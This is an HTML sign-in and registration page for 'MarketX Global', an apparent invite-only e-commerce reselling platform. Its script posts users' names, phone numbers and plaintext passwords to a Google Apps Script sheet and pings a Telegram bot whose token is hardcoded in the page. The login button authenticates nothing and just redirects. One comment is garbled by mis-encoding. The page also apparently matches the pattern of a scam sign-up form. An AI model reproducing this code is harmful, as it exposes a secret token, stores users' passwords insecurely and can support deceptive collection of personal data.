<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global MarketX | Premium Platform</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #d4af37; --dark: #0a0a0a; --gray: #1a1a1a; --text: #e0e0e0; }
        body { font-family: 'Poppins', sans-serif; margin: 0; background: var(--dark); color: var(--text); overflow-x: hidden; }
        
        /* Premium Ad Header */
        .ad-header { height: 280px; position: relative; background: url('https://images.unsplash.com/photo-1614850523296-d8c1af93d400?q=80&w=800') center/cover; }
        .overlay { position: absolute; inset: 0; background: linear-gradient(to bottom, transparent, var(--dark)); }
        .welcome-msg { position: absolute; bottom: 30px; left: 20px; z-index: 2; }
        .welcome-msg h1 { color: var(--gold); margin: 0; font-size: 26px; text-transform: uppercase; letter-spacing: 2px; }

        /* Modern Form Container */
        .form-container { padding: 40px 20px; background: var(--gray); border-radius: 30px 30px 0 0; margin-top: -30px; position: relative; z-index: 3; box-shadow: 0 -10px 20px rgba(0,0,0,0.5); }
        .tabs { display: flex; justify-content: center; gap: 40px; margin-bottom: 30px; }
        .tab { font-size: 16px; font-weight: 600; color: #666; cursor: pointer; transition: 0.3s; padding-bottom: 5px; }
        .tab.active { color: var(--gold); border-bottom: 2px solid var(--gold); }

        .input-group { margin-bottom: 15px; }
        input { width: 100%; padding: 15px; background: #222; border: 1px solid #333; border-radius: 12px; color: white; box-sizing: border-box; outline: none; transition: 0.3s; }
        input:focus { border-color: var(--gold); background: #2a2a2a; }

        .btn-main { width: 100%; padding: 16px; background: var(--gold); color: black; border: none; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; transition: 0.3s; }
        .btn-main:active { transform: scale(0.98); opacity: 0.9; }

        #register-form { display: none; }
    </style>
</head>
<body>

    <div class="ad-header">
        <div class="overlay"></div>
        <div class="welcome-msg">
            <h1>MarketX Global</h1>
            <p style="margin:5px 0; opacity: 0.7;">The Future of E-Commerce Reselling</p>
        </div>
    </div>

    <div class="form-container">
        <div class="tabs">
            <span class="tab active" id="tab-login" onclick="switchTab('login')">SIGN IN</span>
            <span class="tab" id="tab-register" onclick="switchTab('register')">REGISTER</span>
        </div>

        <div id="login-form">
            <div class="input-group"><input type="text" id="l-phone" placeholder="Phone Number"></div>
            <div class="input-group"><input type="password" id="l-pass" placeholder="Password"></div>
            <button class="btn-main" onclick="onLogin()">LOGIN</button>
        </div>

        <div id="register-form">
            <div class="input-group"><input type="text" id="r-name" placeholder="Full Name"></div>
            <div class="input-group"><input type="text" id="r-phone" placeholder="Phone Number"></div>
            <div class="input-group"><input type="password" id="r-pass" placeholder="Create Password"></div>
            <div class="input-group"><input type="text" id="r-invite" placeholder="Invitation Code"></div>
            <button class="btn-main" onclick="onRegister()">CREATE ACCOUNT</button>
        </div>
    </div>

    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbwEV8gFBjcbmUz2636KmlJ_t_nIojePg5NynSx6MjqxAjioDCHTSrvs6t3jfizvbKzO/exec';

        function switchTab(type) {
            document.getElementById('login-form').style.display = type === 'login' ? 'block' : 'none';
            document.getElementById('register-form').style.display = type === 'register' ? 'block' : 'none';
            document.getElementById('tab-login').classList.toggle('active', type === 'login');
            document.getElementById('tab-register').classList.toggle('active', type === 'register');
        }

        async function onRegister() {
            const data = {
                name: document.getElementById('r-name').value,
                phone: document.getElementById('r-phone').value,
                pass: document.getElementById('r-pass').value,
                invite: document.getElementById('r-invite').value
            };

            if(!data.name || !data.phone || !data.pass || !data.invite) {
                alert("Please fill all fields!");
                return;
            }

            // Save to Google Sheets
            try {
                await fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
                
                // Telegram Notification
                const botToken = "8444757495:AAG6kOwh8r_hHFyyRWcXctnK0Ym1Z7pKbzU";
                const chatId = "6698333806";
                const msg = `üîî New User Registration\nName: ${data.name}\nPhone: ${data.phone}\nInvite Code: ${data.invite}`;
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);

                alert("Registration Successful! Please Login.");
                switchTab('login');
            } catch (e) {
                alert("Error connecting to server. Please try again.");
            }
        }

        function onLogin() {
            // Dashboard Page ·ÄÄ·Ä≠·ÄØ ·Äî·Ä±·Ä¨·ÄÄ·Ä∫·Äê·ÄÜ·ÄÑ·Ä∑·Ä∫·Äô·Äæ·Ä¨ ·Äê·Ää·Ä∫·ÄÜ·Ä±·Ä¨·ÄÄ·Ä∫·Äï·Ä´·Äô·Äö·Ä∫
            window.location.href = "dashboard.html";
        }
    </script>
</body>
</html>
